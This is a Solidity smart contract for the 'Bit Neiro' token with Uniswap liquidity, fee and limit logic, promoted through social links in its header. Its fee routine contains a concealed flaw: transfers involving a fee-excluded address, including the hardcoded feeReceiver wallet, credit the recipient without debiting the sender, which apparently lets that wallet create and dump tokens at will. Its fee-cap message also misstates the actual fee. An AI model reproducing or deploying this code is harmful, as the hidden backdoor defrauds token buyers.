/**
 * Telegram: https://t.me/bitneiroeth
 * Website: https://bitneiro.space
 * X: https://x.com/bitneiroeth
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BITNEIRO is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private constant _name = unicode"Bit Neiro";
    string private constant _symbol = unicode"BITNEIRO";
    uint8 private constant _decimals = 18;
    uint256 private constant _tSupplys = 1_000_000_000 * 10 ** _decimals;

    IUniRouter public immutable uniRouter;
    address public uniPair;

    bool private swapping;

    address public feeReceiver;

    uint256 public maxTxThres = (_tSupplys * 20) / 1000;
    uint256 public maxWalletThres = (_tSupplys * 20) / 1000;
    uint256 public swapTxThres = (_tSupplys * 5) / 1000000;
    uint256 public maxSwapThres = (_tSupplys * 10) / 1000;

    bool public limitsOpen = true;
    bool public tradingOpen = false;
    bool public swapOpen = false;

    mapping(address => bool) private _bs;

    uint256 public _longTax = 0;

    uint256 public _shortTax = 0;

    mapping(address => bool) private _infee;
    mapping(address => bool) public _intx;
    mapping(address => bool) public pairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() {
        feeReceiver = address(0x6100ad184A95f8C16ea900d86d1D9A5d3ADBa238);
        uniRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        setInFee(owner(), true);
        setInFee(address(this), true);
        setInFee(feeReceiver, true);

        setInTx(owner(), true);
        setInTx(address(this), true);

        _balances[msg.sender] = _tSupplys;
        emit Transfer(address(0), msg.sender, _tSupplys);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupplys;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setInFee(address account, bool excluded) internal {
        _infee[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setPair(address pair, bool value) internal {
        pairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setInTx(address updAds, bool isEx) internal {
        _intx[updAds] = isEx;
    }

    function makeFeeUpdate(
        uint256 _newBuyFee,
        uint256 _newSellFee
    ) external onlyOwner {
        _longTax = _newBuyFee;
        _shortTax = _newSellFee;

        require(
            _longTax <= 99 && _shortTax <= 99,
            "Must keep fees at 99% or less"
        );
    }

    function removeLimits() external onlyOwner returns (bool) {
        limitsOpen = false;
        return true;
    }

    function _transfer(address folt, address timb, uint256 vune) internal {
        require(folt != address(0), "ERC20: transfer from the zero address");
        require(timb != address(0), "ERC20: transfer to the zero address");
        require(vune > 0, "ERC20: transfer amount should be greater than 0");
        require(
            !_bs[timb] && !_bs[folt],
            "You have been blacklisted from transfering tokens"
        );

        if (limitsOpen) {
            if (folt != owner() && timb != owner()) {
                if (!tradingOpen) {
                    require(
                        _infee[folt] || _infee[timb],
                        "Trading is not active."
                    );
                }

                if (pairs[folt] && !_intx[timb]) {
                    require(
                        vune <= maxTxThres,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        vune + balanceOf(timb) <= maxWalletThres,
                        "Max wallet exceeded"
                    );
                } else if (pairs[timb] && !_intx[folt]) {
                    require(
                        vune <= maxTxThres,
                        "Sell transfer amount exceeds the maxTransactionAmount."
                    );
                } else if (!_intx[timb]) {
                    require(
                        vune + balanceOf(timb) <= maxWalletThres,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            swapOpen &&
            !swapping &&
            pairs[timb] &&
            !_infee[folt] &&
            !_infee[timb]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        _basicTransfer(folt, timb, vune);
    }

    function _basicTransfer(address folt, address timb, uint256 vune) internal {
        (uint256 xvun, uint256 yvun) = _basicTaxCalc(folt, timb, vune);

        _balances[folt] = _balances[folt].sub(xvun);
        _balances[timb] = _balances[timb].add(vune.sub(yvun));

        emit Transfer(folt, timb, vune.sub(yvun));
    }

    function _basicTaxCalc(
        address folt,
        address timb,
        uint256 vune
    ) internal returns (uint256 xvun, uint256 yvun) {
        bool eoll = _infee[folt] || _infee[timb];

        if (
            folt == owner() ||
            timb == owner() ||
            folt == address(this) ||
            timb == address(this)
        ) {
            xvun = vune;
        } else if (!eoll) {
            if (pairs[timb] && _shortTax > 0) {
                yvun = vune.mul(_shortTax).div(1000);
            }
            // on buy
            else if (pairs[folt] && _longTax > 0) {
                yvun = vune.mul(_longTax).div(1000);
            }

            if (yvun > 0) {
                _balances[folt] = _balances[folt].sub(yvun);
                _balances[address(this)] = _balances[address(this)].add(yvun);
                emit Transfer(folt, address(this), yvun);
            }

            xvun = vune - yvun;
        }
    }

    function createPair() external onlyOwner {
        uniPair = IUniswapV2Factory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
        setInTx(address(uniPair), true);
        setPair(address(uniPair), true);

        _approve(address(this), address(uniRouter), _tSupplys);

        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingOpen = true;
        swapOpen = true;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();

        _approve(address(this), address(uniRouter), tokenAmount);

        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > maxSwapThres) contractBalance = maxSwapThres;

        if (contractBalance > swapTxThres) swapTokensForEth(contractBalance);

        payable(feeReceiver).transfer(address(this).balance);
    }
}